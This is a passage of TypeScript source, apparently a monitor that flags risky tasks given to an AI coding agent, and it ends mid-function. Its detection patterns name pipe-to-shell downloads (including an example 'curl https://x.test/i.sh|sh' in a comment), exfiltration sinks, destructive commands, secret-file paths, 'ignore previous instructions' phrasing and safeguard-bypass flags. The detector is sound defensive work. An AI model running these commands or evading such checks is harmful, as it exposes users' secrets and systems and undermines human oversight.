/**
 * Signals for the security adjudication (docs/design/adjudicator-security.md, 4.2 and 4.3):
 * cue ids found in task text, and the session taint. Only cue ids leave this module: matched
 * text is never kept, stored or sent.
 *
 * Every pattern is linear. The text is capped (MAX_TEXT), patterns use no nested or overlapping
 * quantifiers, and a pattern that needs two parts anchors on the first and tests a bounded window
 * after it (near()), so a 100 KB adversarial input costs the same as an 8 KB one. Path tokens
 * are matched by plain string tests and by a `*`-only wildcard matcher (never a RegExp built from
 * user text), under an operation budget.
 */

import type { StorageAdapter } from "../../storage/adapter.js";
import { normalize } from "../redact.js";
import { normalizeTool } from "./grant.js";
import { GatedRegExp, mayMatch } from "./prefilter.js";
import { isPersistencePath } from "./taxonomy.js";
import type { CueId, IntentCueId } from "./types.js";
import { CUE_IDS, INTENT_CUE_IDS } from "./types.js";

/** Text beyond this is not read. */
export const MAX_TEXT = 8 * 1024;
/** A window after an anchor match, and how many anchors one pattern may try. */
const WINDOW = 80;
const MAX_ANCHORS = 40;
/** Path tokens inspected, and their length. */
const MAX_TOKENS = 1500;
const MAX_TOKEN = 160;
/** Distinct path-like tokens tried against PERSISTENCE_PATHS. */
const MAX_PERSIST_CHECKS = 300;
/** What a URL becomes before the verb and noun patterns run (`<` and `>` never occur in a URL match). */
const URL_MARK = "<url>";
/** Operation budget of the `*` matcher over all secretPaths and tokens of one text. */
const WILD_BUDGET = 400_000;

export interface TextSignals {
  /** In CUE_IDS order. */
  cues: CueId[];
  /** In INTENT_CUE_IDS order. */
  intent: IntentCueId[];
  /** The text was longer than MAX_TEXT. */
  truncated: boolean;
}

export interface SignalOptions {
  /** A web tool is granted: research verbs ("research", "look up") count as untrusted input. */
  webTool?: boolean;
  /** security.secretPaths: extra patterns, `*` the only wildcard. */
  secretPaths?: readonly string[];
}

// --- text hygiene -------------------------------------------------------------------------------

let IGNORABLE: RegExp | undefined;

/** Default-ignorable characters removed, NFKC, collapsed whitespace, lower case, capped. */
function prepare(text: string): { text: string; truncated: boolean } {
  IGNORABLE ??= /\p{Default_Ignorable_Code_Point}/gu;
  // Cap before the heavier passes: a huge input must not cost more than a large one.
  const head = text.length > MAX_TEXT * 2 ? text.slice(0, MAX_TEXT * 2) : text;
  const clean = normalize(head.replace(IGNORABLE, "").normalize("NFKC").replace(IGNORABLE, ""));
  const truncated = text.length > MAX_TEXT * 2 || clean.length > MAX_TEXT;
  return { text: clean.slice(0, MAX_TEXT).toLowerCase(), truncated };
}

/** Anchor matches of `re` (global) whose next WINDOW characters match `window`. */
function near(text: string, anchor: RegExp, window: RegExp, span = WINDOW): boolean {
  let n = 0;
  for (const m of text.matchAll(anchor)) {
    if (n++ >= MAX_ANCHORS) break;
    const from = m.index + m[0].length;
    if (window.test(text.slice(from, from + span))) return true;
  }
  return false;
}

/** Like near(), but the window may sit `before` characters before the anchor or `after` it. */
function around(text: string, anchor: RegExp, window: RegExp, before: number, after: number) {
  let n = 0;
  for (const m of text.matchAll(anchor)) {
    if (n++ >= MAX_ANCHORS) break;
    const from = m.index + m[0].length;
    if (window.test(text.slice(Math.max(0, m.index - before), m.index))) return true;
    if (window.test(text.slice(from, from + after))) return true;
  }
  return false;
}

/**
 * near() for an exfil verb: an anchor right after a negation ("don't send", "never leak") is
 * skipped. `sink` is a pattern, or a test of the whole window when it needs two parts.
 */
function sinkAfter(
  text: string,
  anchor: RegExp,
  sink: RegExp | ((window: string) => boolean),
  span: number,
): boolean {
  let n = 0;
  for (const m of text.matchAll(anchor)) {
    if (n++ >= MAX_ANCHORS) break;
    if (P.negated.test(text.slice(Math.max(0, m.index - 24), m.index))) continue;
    const from = m.index + m[0].length;
    const w = text.slice(from, from + span);
    if (typeof sink === "function" ? sink(w) : sink.test(w)) return true;
  }
  return false;
}

/**
 * "follow the steps at <url or an outsider's page>": the verb phrase, then the source in one
 * window after it, or named just before it ("from the page you just read: run the commands").
 */
function followSteps(text: string): boolean {
  let n = 0;
  for (const m of text.matchAll(P.followAnchor)) {
    if (n++ >= MAX_ANCHORS) break;
    const from = m.index + m[0].length;
    if (!P.followWhat.test(text.slice(from, from + 20))) continue;
    if (P.followFrom.test(text.slice(from, from + 140))) return true;
    if (P.followFrom.test(text.slice(Math.max(0, m.index - 60), m.index))) return true;
  }
  return false;
}

// --- text patterns ------------------------------------------------------------------------------
// `(?<![a-z0-9])` instead of \b where a pattern starts with a symbol (`--force`).

const NB = "(?<![a-z0-9])";
const NA = "(?![a-z0-9])";
/** Not right after a determiner or a noun that makes the next word a noun ("the blog post"). */
const NOUN_BEFORE =
  "(?<!(?:the|a|an|this|that|its|their|his|her|my|your|our|latest|last|first|next|new|each|every|blog|forum) )";

/**
 * "| sh", "|sudo -E bash", "| env sh", "| /usr/bin/env bash", "| /bin/sh": a pipe into an
 * interpreter. Every optional part starts with its own literal, so the pattern stays linear.
 */
const BIN_DIR = "/(?:usr/)?(?:local/)?bin/";
const PIPE_TO = `\\|\\s*(?:sudo\\s+(?:-[a-z]{1,4}\\s+){0,3})?(?:(?:${BIN_DIR})?env\\s+)?(?:${BIN_DIR})?`;

const LOCAL_URL =
  /^https?:\/\/(?:localhost|127\.|0\.0\.0\.0|\[::1\]|[a-z0-9-]+\.local[:/]|10\.|192\.168\.)/;
/**
 * A host written without a scheme ("blog.example.test/hooks"). File names share the shape
 * ("vite.config.ts", "notes.md"), so only a closed list of host suffixes counts, the name must
 * not continue with another dot-word ("x.test.ts") or sit inside a path or an address, and a bare
 * two-label name needs a path or a com/net/org/gov/edu suffix ("socket.io" alone is a library).
 * Each label is bounded and cannot hold a dot, so a name splits into labels one way only.
 */
const HOST_START = "(?<![a-z0-9@._/\\\\-])[a-z0-9][a-z0-9-]{0,62}";
const HOST_END = "(?![a-z0-9_-]|\\.[a-z0-9])";
/**
 * A character of a URL's path or query. A shell pipe, a `;` and a backtick end the URL, so in
 * "curl https://x.test/i.sh|sh" blankUrls leaves the "|sh" for the fetch-exec pattern.
 */
const URL_CHAR = "[^\\s<>\"')\\]|;`]";
const HOST_PATH = `[/?#]${URL_CHAR}{0,200}`;
const HOST_TLD =
  "(?:\\.com|\\.net|\\.org|\\.gov|\\.edu|\\.io|\\.dev|\\.app|\\.co|\\.ai|\\.xyz|\\.info|\\.biz|\\.cloud|\\.site|\\.online|\\.tech|\\.test|\\.invalid)";
const BARE_HOST =
  `${HOST_START}(?:\\.[a-z0-9-]{1,63}){1,3}${HOST_TLD}${HOST_END}(?:${HOST_PATH})?` +
  `|${HOST_START}(?:\\.com|\\.net|\\.org|\\.gov|\\.edu)${HOST_END}(?:${HOST_PATH})?` +
  `|${HOST_START}${HOST_TLD}${HOST_END}${HOST_PATH}`;
const URL_RE = new GatedRegExp(
  `https?://${URL_CHAR}{3,200}|www\\.[a-z0-9-]{2,60}\\.[a-z]{2,}(?:${HOST_PATH})?|${BARE_HOST}`,
  "g",
);

function hasUrl(text: string): boolean {
  let n = 0;
  for (const m of text.matchAll(URL_RE)) {
    if (n++ >= 200) break;
    if (!LOCAL_URL.test(m[0])) return true;
  }
  return false;
}

/**
 * Every URL replaced by URL_MARK, so words in a path ("/release", "/share", "/webhook") add no
 * verb cue. The host is kept after the mark only when it is itself a sink (a paste site, an
 * attacker's server), which is what the egress-public and exfiltrate patterns look for.
 */
function blankUrls(text: string): string {
  if (!mayMatch(URL_RE.needles, text)) return text;
  return text.replace(URL_RE, (u) => {
    const host = u.replace(/^https?:\/\//, "").split(/[/?#:]/, 1)[0] ?? "";
    return P.exfilSink.test(host) || P.egressPublic.test(host) ? `${URL_MARK} ${host}` : URL_MARK;
  });
}

// Gated: a pattern whose literals the text lacks is not run, so V8 does not compile it (most of
// a hook's cost here). prefilter.ts derives the literals from the pattern itself.
const re = (body: string): RegExp => new GatedRegExp(body);
const g = (body: string): RegExp => new GatedRegExp(body, "g");

/** The cue patterns, for the prefilter's soundness test only. */
export const SIGNAL_PATTERNS_FOR_TEST: () => Readonly<Record<string, RegExp>> = () => P;

const P = {
  outsider: re(
    `${NB}(?:(?:external|outside|third[- ]party|public|untrusted|anonymous|unknown|open[- ]source)\\s+(?:issues?|prs?|pull requests?|contributions?|contributors?|comments?|users?|content|input|submissions?|reports?|patch(?:es)?|data|files?)|(?:issue|pull request|pr|ticket|comment|bug report)s?\\s+(?:from|by|filed by|opened by|submitted by)\\s+(?:an?\\s+|the\\s+)?(?:external|outside|public|unknown|stranger|user|contributor|customer|anyone))${NA}|${NB}untrusted${NA}`,
  ),
  message: re(
    `${NB}(?:inbox|(?:read|check|triage|summari[sz]e|process|go through|handle|respond to|reply to|answer)\\s+(?:the\\s+|my\\s+|new\\s+|incoming\\s+|all\\s+)?(?:e-?mails?|messages?|dms?|tickets?|support requests?|slack|chats?)|(?:e-?mails?|messages?|dms?)\\s+from)${NA}`,
  ),
  scrape: re(
    `${NB}(?:scrap(?:e|es|ed|ing)|crawl(?:s|ed|ing)?|web ?search|search the (?:web|internet)|browse (?:to|the)|download|look (?:it |this |that )?up online|research online)${NA}`,
  ),
  research: re(
    `${NB}(?:research|look ?up|investigate (?:options|sources|libraries)|find (?:out )?(?:online|sources)|survey (?:of )?(?:options|libraries|tools)|compare (?:libraries|options|vendors|tools)|read (?:the )?(?:docs|documentation|blog|article|changelog)|external (?:options|sources|docs)|fetch(?:es|ed|ing)? (?:the|a|this|that|their|its) (?:[a-z'-]+ ){0,3}(?:web ?)?(?:pages?|websites?|articles?|feeds?)(?=$|[,.;:!?]| (?:for|about|at|from|on|of|and|then|to|with|in)${NA}))${NA}`,
  ),
  thirdParty: re(
    `${NB}(?:third[- ]party|external (?:api|service|site|website|vendor|library|package|source|docs?)s?|someone else'?s|unknown (?:source|site|author|repo)|untrusted (?:source|site|repo))${NA}`,
  ),
  followAnchor: g(
    `${NB}(?:follow|run|execute|apply|use|do|copy)\\s+(?:the\\s+|these\\s+|those\\s+|its\\s+)?`,
  ),
  followWhat: re(`^(?:steps|instructions|commands?|guide|tutorial|readme|snippets?|recipe)`),
  followFrom: re(
    `(?:${URL_MARK}|https?:|www\\.|(?:from|at|in|on) (?:the |this |that |a )?(?:blog|article|issue|pr|page|site|website|link|url|gist|stack ?overflow|forum|readme|post|thread|comment))`,
  ),
  secretWords: re(
    `${NB}(?:api[ _-]?keys?|access[ _-]?tokens?|auth(?:entication)? tokens?|bearer tokens?|secrets?|passwords?|passwd|credentials?|private keys?|ssh keys?|service accounts?|oauth tokens?|connection strings?|aws_secret\\w*|session cookies?)${NA}`,
  ),
  sensitive: re(
    `${NB}(?:production (?:database|db|data)|prod (?:database|db|data)|customer (?:data|records|emails?|lists?)|user data|pii|personal (?:data|information)|hipaa|payment data|credit cards?|social security|financial records|medical records|patient data)${NA}`,
  ),
  // "post" and "email" after a determiner are nouns ("the blog post", "the latest email"), not a send
  egress: re(
    `${NB}(?:send(?:s|ing)?|${NOUN_BEFORE}post(?:s|ing)?|publish(?:es|ing)?|upload(?:s|ing)?|push(?:es|ing)?|deploy(?:s|ing)?|share|${NOUN_BEFORE}e-?mail(?:s|ing)?|webhook|tweet|forward|transmit|release|notify|ship)${NA}`,
  ),
  // A public issue is where outsiders write (outsider-content), not a place things are sent to.
  egressPublic: re(
    `${NB}(?:gist|pastebin|paste\\.?bin|hastebin|transfer\\.sh|webhook\\.site|requestbin|pipedream|ngrok|public (?:repo|repository|gist|bucket|channel|page|url|link|pastebin)|publicly|to the internet|tweet)${NA}`,
  ),
  destructive: re(
    `${NB}(?:delete|remove all|wipe|purge|truncate|erase|destroy|rimraf|overwrite|drop (?:the )?(?:table|database|db|schema|collection))${NA}`,
  ),
  force: re(
    `${NB}(?:force[- ]push|rm -(?:[a-z]{0,3}r[a-z]{0,3}f|[a-z]{0,3}f[a-z]{0,3}r)|reset --hard|git clean -[a-z]{0,4}f|drop (?:table|database|db|schema)|truncate table|delete (?:all|every)|mkfs|dd if=|push (?:--force|-f))|--force-with-lease|> ?/dev/sd`,
  ),
  privilege: re(
    `${NB}(?:sudo|chmod|chown|setuid|visudo|doas|iam|rbac|clusterrole(?:binding)?|kubectl|terraform (?:apply|destroy)|helm (?:install|upgrade)|root access|admin(?:istrator)? (?:access|rights|role)|grant (?:access|permissions?|admin)|assume[- ]role|privileged)${NA}|--privileged`,
  ),
  prod: re(
    `${NB}(?:(?:prod|production)[ -](?:env(?:ironment)?|servers?|databases?|dbs?|clusters?|deploy(?:ment)?s?|data|bucket|account|branch|credentials?|keys?|traffic|systems?|infra(?:structure)?)|(?:to|on|in|against) (?:prod|production))${NA}`,
  ),
  persistence: re(
    `(?<![a-z0-9_])(?:\\.claude|claude(?:\\.local)?\\.md|agents\\.md|\\.mcp\\.json|\\.eminiar|\\.git/hooks|\\.github/workflows|\\.husky|\\.cursorrules|\\.cursor/rules|settings\\.json|\\.bashrc|\\.zshrc|\\.zprofile|\\.zshenv|\\.bash_profile|authorized_keys|crontab|cron job|launch ?(?:agents?|daemons?)|systemd (?:unit|service)|git hooks?|pre-?commit hooks?|postinstall|preinstall|dotfiles|shell (?:rc|profile)|skill files?|agent (?:files?|definitions?)|subagent definitions?|system prompts?)${NA}`,
  ),
  pkgAnchor: g(`${NB}package\\.json${NA}`),
  pkgScripts: re(`(?:scripts?|postinstall|preinstall|prepare|hooks?|lifecycle)`),
  install: re(
    `${NB}(?:npm (?:i|install|add|ci)|pnpm (?:i|install|add)|yarn (?:add|install)|pip3? install|pipx install|uv (?:add|pip install|tool install)|cargo (?:install|add)|go (?:get|install)|gem install|brew install|apt(?:-get)? install|bundle add|composer require|npx|uvx|bunx|pnpm dlx|install (?:the |a |this )?(?:package|dependency|dependencies|library|plugin|extension|skill|binary|tool))${NA}`,
  ),
  clone: re(
    `${NB}(?:git clone|gh repo clone|hg clone|svn checkout|git submodule add|clone (?:the |this |that |a |an )?(?:external |remote |public )?(?:repo|repository|project|fork)|download (?:the |a )?(?:repo|repository|zip|tarball|archive|release|binary|installer))${NA}`,
  ),
  addMcp: re(
    `${NB}(?:claude mcp add|mcp add|add (?:an? |the )?(?:remote )?mcp(?: server)?|install (?:an? |the )?mcp|new mcp server|connect (?:to )?(?:an? )?(?:remote )?mcp|claude plugin install|plugin install|plugin marketplace add|marketplace add|add (?:an? |the )?plugin|install (?:an? |the )?plugin)${NA}`,
  ),
  pipeShell: re(
    `(?:curl|wget|fetch|iwr|invoke-webrequest)[^\\n|]{0,160}${PIPE_TO}(?:ba|z|da|k)?sh${NA}|(?:curl|wget)[^\\n|]{0,160}${PIPE_TO}(?:python3?|node|perl|ruby|php)${NA}|${NB}(?:bash|sh|zsh|source) <\\(\\s*(?:curl|wget)|${NB}iex\\s*\\(?\\s*(?:iwr|irm|invoke-)`,
  ),
  remoteExec: re(
    `${NB}(?:npx|bunx|uvx|pnpm dlx)\\s+(?:(?:-y|--yes|--from)\\s+|@[a-z0-9._-]+/|github:|git\\+|https?://|${URL_MARK})`,
  ),
  installScriptAnchor: g(`${NB}install(?:ation)? (?:script|command|one-?liner)`),
  // Genuine review wording only: a bare "prevent", "detect" or "harden" is not one, nor is the noun
  // "audit log". Anyone can write these words, so they are trusted only so far: extractAll takes
  // them from the task's own text alone (never an agent or role description) and drops them when
  // any text has an intent cue, and score.ts lets them lower the score but never remove a floor.
  // Not inside an address or a path: "audit@mail.example" or "/audit/" is no review.
  review: re(
    `(?<![a-z0-9@._/-])(?:audit(?:s|ed|ing)?(?! (?:logs?|trails?|events?|entry|entries|records?|tables?)${NA})|pen-?test(?:s|ing)?|threat model(?:s|ing)?|(?:check|make sure|ensure|verify) (?:that |whether |if )?(?:we|it|nothing|no one|nobody) (?:don'?t|do not|never|doesn'?t|does not|cannot|can'?t|isn'?t|is not|won'?t|will not)|security (?:review|audit|test|check)s?)(?![a-z0-9@_/-])`,
  ),
  // review / scan for: counts only with a security noun after it
  reviewAnchor: g(`${NB}(?:review(?:s|ed|ing)?|scan(?:s|ning)? for)${NA}`),
  reviewFor: re(
    `(?:secrets?|vulnerab|inject|leak|exfil|malicious|credential|security|unsafe|backdoor|exploit|cve-|tokens?|passwords?|api keys?|xss|csrf|ssrf|pii)`,
  ),
  // test(s) for|that / write tests: only with a flaw after it. Testing the token refresh or the
  // password form is ordinary feature work, not a review.
  testAnchor: g(
    `${NB}(?:tests? (?:for|that)|testing (?:for|that)|write (?:a |unit |the )?tests?)${NA}`,
  ),
  testFor: re(
    `(?:vulnerab|inject|leak|exfil|malicious|unsafe|backdoor|exploit|cve-|xss|csrf|ssrf|security (?:bugs?|holes?|issues?|flaws?|problems?|regressions?))`,
  ),
  // intent (OWASP ASI01)
  ignore: re(
    `(?:ignore|disregard|forget|override|bypass)\\s+(?:(?:all|any|the|your|my|these|those)\\s+)?(?:(?:previous|prior|above|earlier|preceding|original|system|safety)\\s+)(?:instructions?|prompts?|rules?|directions?|guidelines?|messages?)`,
  ),
  exfilWord: re(
    `${NB}(?:exfiltrat\\w*|(?:steal|siphon)\\w*\\s+(?:(?:the|all|any|their|our|your)\\s+)?(?:data|secrets?|keys?|credentials?|tokens?|passwords?|env\\w*))${NA}`,
  ),
  // "leak" and "dump" are review words too ("check we don't leak secrets"): they need a sink after them
  leakAnchor: g(
    `${NB}(?:leak|dump)\\w*\\s+(?:(?:the|all|any|their|our|your)\\s+)?(?:data|secrets?|keys?|credentials?|tokens?|passwords?|env\\w*)${NA}`,
  ),
  leakSink: re(
    `(?:attacker|evil|malicious|my (?:own )?server|external server|webhook|requestbin|ngrok|burpcollaborator|interact\\.sh|oast\\.|gist|pastebin|hastebin|transfer\\.sh|pipedream|${URL_MARK})`,
  ),
  // "don't send", "never leak", "prevent leaking": the words just before an exfil anchor
  negated: re(
    `(?:n't|${NB}(?:dont|cant|wont|not|never|no|nobody|nothing|without|avoid|prevent|stop|block|against))\\s+(?:[a-z]+\\s+)?$`,
  ),
  exfilAnchor: g(`${NB}(?:send|post|upload|curl|forward|e-?mail|transmit)`),
  exfilSink: re(
    `(?:attacker|evil|malicious|my (?:own )?server|external server|webhook\\.site|requestbin|ngrok|burpcollaborator|interact\\.sh|oast\\.)`,
  ),
  // An outside destination: a (non-local) URL, or an e-mail address.
  outDest: re(`(?:${URL_MARK}|\\w@[a-z0-9-]+\\.[a-z])`),
  // The environment (where secrets live) as the thing being sent.
  envObj: re(
    `${NB}(?:env(?:ironment)?[ _-]?var(?:iable)?s?|process\\.env|printenv|(?:the|all|its|their) env)${NA}`,
  ),
  // "pipe its output to bash": the shell runs whatever text came back
  nlPipe: re(
    `${NB}pip(?:e|es|ed|ing)\\s+(?:it|them|that|this|its output|the output|the result|the script)\\s+(?:in)?to\\s+(?:sudo\\s+)?(?:(?:ba|z|da|k)?sh|python3?|node|perl|ruby)${NA}`,
  ),
  encode: re(
    `${NB}(?:base64|b64)(?:[- ]encode)?\\s+(?:the|it|them|this|all|your|that|each|every|any)${NA}|${NB}(?:encode|obfuscate|hide)\\s+(?:(?:the|it|them|this|all)\\s+)?(?:data|output|secrets?|contents?|env|keys?|credentials?)\\s+(?:in|as|with|using)\\s+(?:base64|hex|rot13)`,
  ),
  disable: re(
    `${NB}(?:disable|bypass|skip|turn off|circumvent|remove|evade|work around|without)\\s+(?:(?:the|all|any|your|its)\\s+)?(?:hooks?|permissions?|sandbox(?:ing)?|safety|safeguards?|guardrails?|security (?:checks?|controls?|hooks?)|approvals?|confirmations?|policy|restrictions?|eminiar|adjudicator|classifier|monitor(?:ing)?|logging|audit)${NA}|--dangerously-[a-z-]+|--no-verify|--no-sandbox|bypasspermissions|dangerously-skip-permissions`,
  ),
  conceal: re(
    `${NB}(?:don'?t|do not|never|without)\\s+(?:tell|mention|show|reveal|inform|notify|alert|log|report|disclose)(?:ing)?\\s+(?:(?:it|this|that|anything)\\s+(?:to\\s+)?)?(?:the |any )?(?:user|human|operator|owner|anyone|them|me)${NA}|(?:^|[,.;:]\\s*|${NB}(?:then|and)\\s+)say nothing${NA}|${NB}(?:hide|conceal|cover up|obfuscate)\\s+(?:this|it|the|your)\\s+(?:action|activity|change|step|command|output|trace|logs?|tracks?)${NA}|${NB}(?:silently|quietly)\\s+(?:send|upload|post|exfil\\w*|delete|run)${NA}|without (?:the user|anyone) (?:knowing|noticing|seeing)`,
  ),
};

// --- path tokens --------------------------------------------------------------------------------

const TOKEN_SPLIT = /[\s"'`<>(){},;|&=]+/;
const SECRET_EXT = /\.(?:pem|key|p12|pfx|keystore|jks|kdbx|ppk)$/;
const SECRET_BASE: ReadonlySet<string> = new Set([
  ".npmrc",
  ".netrc",
  ".pypirc",
  ".pgpass",
  ".git-credentials",
  ".htpasswd",
  "credentials",
  "credentials.json",
  "secrets.json",
  "secrets.yml",
  "secrets.yaml",
  "secrets.toml",
  "secret.json",
  "service-account.json",
  "kubeconfig",
  "shadow",
]);
const SECRET_DIRS: ReadonlySet<string> = new Set([".ssh", ".aws", ".gnupg", ".kube", ".azure"]);
const ENV_TEMPLATE = /\.(?:example|sample|template|dist|defaults?)$/;

/** Is this lower-cased path token a well-known secret file? Plain string tests only. */
function secretToken(token: string): boolean {
  const parts = token.split("/").filter(Boolean);
  const base = parts.at(-1);
  if (!base) return false;
  if (parts.slice(0, -1).some((p) => SECRET_DIRS.has(p)) || SECRET_DIRS.has(base)) {
    // `.ssh/config`, `~/.aws/credentials`; a bare `.ssh` too. `.pub` is a public key.
    return !base.endsWith(".pub");
  }
  if (base === ".env" || (base.startsWith(".env.") && !ENV_TEMPLATE.test(base))) return true;
  if (/^id_(?:rsa|ed25519|ecdsa|dsa)$/.test(base)) return true;
  if (SECRET_EXT.test(base) && base.length > 4) return true;
  if (SECRET_BASE.has(base)) return true;
  if (token === "/etc/passwd" || token === "/etc/shadow") return true;
  if (parts.at(-2) === ".docker" && base === "config.json") return true;
  if (parts.at(-2) === "gcloud" && parts.at(-3) === ".config") return true;
  return false;
}

/**
 * `*`-only wildcard match of `pattern` against `text` (both lower case). Iterative with one
 * backtrack point, so no RegExp is built from the pattern; `budget.n` bounds the work.
 */
export function wildcardMatch(pattern: string, text: string, budget: { n: number }): boolean {
  let p = 0;
  let t = 0;
  let star = -1;
  let mark = 0;
  while (t < text.length) {
    if (budget.n-- <= 0) return false;
    if (p < pattern.length && pattern[p] === "*") {
      star = p++;
      mark = t;
    } else if (p < pattern.length && pattern[p] === text[t]) {
      p++;
      t++;
    } else if (star >= 0) {
      p = star + 1;
      t = ++mark;
    } else return false;
  }
  while (p < pattern.length && pattern[p] === "*") p++;
  return p === pattern.length;
}

/** The candidates a pattern is tried against: the whole token and its path suffixes (deepest 6). */
function suffixes(token: string): string[] {
  const out = [token];
  let at = token.indexOf("/");
  while (at >= 0 && out.length < 7) {
    if (at + 1 < token.length) out.push(token.slice(at + 1));
    at = token.indexOf("/", at + 1);
  }
  return out;
}

/**
 * Path cues of the text's tokens: a secret file (built-in rules, then security.secretPaths) and a
 * persistence path. Persistence is matched against taxonomy PERSISTENCE_PATHS itself, so the
 * scorer's list and the extractor cannot drift apart.
 */
function pathCues(
  text: string,
  secretPaths: readonly string[],
): { secret: boolean; persistence: boolean } {
  const tokens = text.split(TOKEN_SPLIT, MAX_TOKENS);
  const extra = secretPaths
    .map((s) => s.trim().toLowerCase())
    .filter((s) => s && s.replace(/\*/g, "").length > 0);
  const budget = { n: WILD_BUDGET };
  const seen = new Set<string>();
  let secret = false;
  let persistence = false;
  for (let tok of tokens) {
    if (secret && persistence) break;
    if (!tok) continue;
    tok = tok
      .slice(0, MAX_TOKEN)
      .replace(/\\/g, "/")
      .replace(/^\.\//, "")
      .replace(/^~(?=\/)/, "~")
      .replace(/[.,:;!?]+$/, "");
    if (!tok) continue;
    if (!persistence && seen.size < MAX_PERSIST_CHECKS && /[./_]/.test(tok) && !seen.has(tok)) {
      seen.add(tok);
      if (isPersistencePath(tok)) persistence = true;
    }
    if (secret) continue;
    if (secretToken(tok)) {
      secret = true;
      continue;
    }
    if (extra.length && budget.n > 0) {
      const cands = suffixes(tok);
      outer: for (const pat of extra)
        for (const c of cands)
          if (wildcardMatch(pat, c, budget)) {
            secret = true;
            break outer;
          }
    }
  }
  return { secret, persistence };
}

// --- the public extractor -----------------------------------------------------------------------

/** Cue ids and intent ids found in `input`. Deterministic; never throws. */
export function extractSignals(input: string, opts: SignalOptions = {}): TextSignals {
  const empty: TextSignals = { cues: [], intent: [], truncated: false };
  try {
    if (!input) return empty;
    const prepared = prepare(input);
    const truncated = prepared.truncated;
    const c = new Set<CueId>();
    const i = new Set<IntentCueId>();

    // The url cue first; then the URLs go, so their path words add no verb or noun cue.
    if (hasUrl(prepared.text)) c.add("url");
    const text = blankUrls(prepared.text);

    if (P.outsider.test(text)) c.add("outsider-content");
    if (P.message.test(text)) c.add("message");
    if (P.scrape.test(text) || (opts.webTool && P.research.test(text))) c.add("scrape");
    if (P.thirdParty.test(text)) c.add("third-party");
    if (followSteps(text)) c.add("follow-steps");

    const paths = pathCues(text, opts.secretPaths ?? []);
    if (paths.secret) c.add("secret-file");
    if (P.secretWords.test(text)) c.add("credential");
    if (P.sensitive.test(text)) c.add("sensitive-data");

    const pub = P.egressPublic.test(text);
    if (pub) c.add("egress-public");
    if (pub || P.egress.test(text)) c.add("egress");

    const force = P.force.test(text);
    if (force) c.add("destructive-force");
    if (force || P.destructive.test(text)) c.add("destructive");

    if (P.privilege.test(text)) c.add("privilege");
    if (P.prod.test(text)) c.add("prod");
    if (
      paths.persistence ||
      P.persistence.test(text) ||
      around(text, P.pkgAnchor, P.pkgScripts, 40, WINDOW)
    )
      c.add("persistence");

    const install = P.install.test(text);
    if (install) c.add("install");
    if (P.clone.test(text)) c.add("clone");
    // Piping output into a shell (in words) is fetch-and-exec when the text fetches something.
    const remote =
      install || c.has("url") || c.has("scrape") || c.has("third-party") || c.has("clone");
    const exec =
      P.pipeShell.test(text) || P.remoteExec.test(text) || (remote && P.nlPipe.test(text));
    if (exec || near(text, P.installScriptAnchor, P.followFrom, 120)) c.add("fetch-exec");
    if (P.addMcp.test(text)) c.add("add-mcp");

    const conceal = P.conceal.test(text);
    if (P.ignore.test(text)) i.add("ignore-instructions");
    if (
      P.exfilWord.test(text) ||
      sinkAfter(text, P.exfilAnchor, P.exfilSink, 100) ||
      sinkAfter(text, P.leakAnchor, P.leakSink, 100) ||
      // sending the environment, or sending anything the text says to hide, to an outside address
      sinkAfter(text, P.exfilAnchor, (w) => P.outDest.test(w) && (conceal || P.envObj.test(w)), 100)
    )
      i.add("exfiltrate");
    if (P.encode.test(text)) i.add("encode-data");
    if (P.disable.test(text)) i.add("disable-safeguards");
    if (conceal) i.add("conceal");

    // Review wording halves the text cues in the score (score.ts), so text with an attacker's
    // intent never gets it. extractAll applies the same rule across texts.
    if (
      i.size === 0 &&
      (P.review.test(text) ||
        near(text, P.reviewAnchor, P.reviewFor) ||
        near(text, P.testAnchor, P.testFor))
    )
      c.add("review-context");

    return {
      cues: CUE_IDS.filter((x) => c.has(x)),
      intent: INTENT_CUE_IDS.filter((x) => i.has(x)),
      truncated,
    };
  } catch {
    return empty;
  }
}

/**
 * Cues of several texts merged; each is read within its own cap. `task` is the task's own text
 * (title, detail, the call's description and prompt); `context` is other text the cues are read
 * from, such as an agent's or role's description. That text is committed to the repository, so
 * anyone who can change it could write review wording there: its review wording never counts.
 * Review wording from the task counts only when no text, task or context, has an intent cue.
 */
export function extractAll(
  task: ReadonlyArray<string | undefined>,
  opts: SignalOptions = {},
  context: ReadonlyArray<string | undefined> = [],
): TextSignals {
  const c = new Set<CueId>();
  const i = new Set<IntentCueId>();
  let truncated = false;
  let review = false;
  const read = (texts: ReadonlyArray<string | undefined>, own: boolean): void => {
    for (const t of texts) {
      if (!t) continue;
      const s = extractSignals(t, opts);
      for (const x of s.cues) {
        if (x === "review-context") review ||= own;
        else c.add(x);
      }
      for (const x of s.intent) i.add(x);
      truncated ||= s.truncated;
    }
  };
  read(task, true);
  read(context, false);
  if (review && i.size === 0) c.add("review-context");
  return {
    cues: CUE_IDS.filter((x) => c.has(x)),
    intent: INTENT_CUE_IDS.filter((x) => i.has(x)),
    truncated,
  };
}

// --- session taint ------------------------------------------------------------------------------

export interface Taint {
  /** Provider-safe ids of the untrusted-input tools the session used (at most 8). */
  tools: string[];
  /** ok: read · off: lookback 0 · unavailable: the query failed (reason "history unavailable"). */
  status: "ok" | "off" | "unavailable";
}

/** What taint reads from the database: the narrow slice of the storage adapter it needs. */
export interface TaintSource {
  /** Distinct tool names of the session's tool calls at or after `sinceTs` (ms). */
  eventToolsSince?: (sessionId: string, sinceTs: number, limit: number) => string[];
  eventsBySession?: StorageAdapter["eventsBySession"];
}

/** Built-ins that bring outsider-written content into the context. */
const TAINT_BUILTINS: ReadonlySet<string> = new Set(["WebFetch", "WebSearch"]);
const TAINT_EM: ReadonlySet<string> = new Set(["em_fetch_and_index"]);
/** Rows read when the adapter has no distinct-tools query (oldest first, payloads included). */
const FALLBACK_ROWS = 400;

/** Is a recorded tool name one that reads outsider-written content? */
export function taintingTool(raw: string, trusted: readonly string[] = []): string | undefined {
  const t = normalizeTool(raw, trusted);
  if (!t) return undefined;
  if (t.tool.kind === "builtin") return TAINT_BUILTINS.has(t.tool.id) ? t.tool.id : undefined;
  if (t.tool.kind === "em") return TAINT_EM.has(t.tool.id) ? t.tool.id : undefined;
  const m = t.tool.mcp;
  if (!m) return undefined;
  // A browser reads the open web; a SaaS or unknown server's read brings others' messages, issues, pages.
  if (m.cls === "browser") return t.tool.id;
  return m.verb === "read" && (m.cls === "saas" || m.cls === "unknown") ? t.tool.id : undefined;
}

/**
 * Untrusted-input tools the session used in the last `lookbackMin` minutes (design 4.3). One
 * indexed read; any failure is "unavailable", never an exception. `now` is a test seam.
 */
export function sessionTaint(
  db: TaintSource | undefined,
  sessionId: string | undefined,
